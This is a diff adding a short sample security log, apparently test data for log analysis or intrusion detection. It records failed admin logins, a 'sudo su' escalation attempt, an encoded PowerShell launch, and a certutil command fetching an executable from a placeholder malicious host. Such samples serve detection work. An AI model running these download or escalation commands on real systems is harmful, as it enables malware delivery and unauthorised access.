@@ -1,0 +1,7 @@
+2025-07-12 08:21:14 INFO User login attempt - user=admin ip=192.168.1.5 status=fail
+2025-07-12 08:21:16 INFO User login attempt - user=admin ip=192.168.1.5 status=fail
+2025-07-12 08:21:18 INFO User login attempt - user=admin ip=192.168.1.5 status=fail
+2025-07-12 08:22:05 INFO Privilege escalation attempt - user=guest cmd=sudo su
+2025-07-12 08:22:40 WARNING Suspicious process - cmd=cmd.exe /c powershell -enc ZgBvAG8A
+2025-07-12 08:23:10 INFO User login attempt - user=john ip=192.168.1.99 status=success
+2025-07-12 08:24:00 WARNING Suspicious process - cmd=certutil.exe -urlcache -split -f http://malicious.com/m.exe
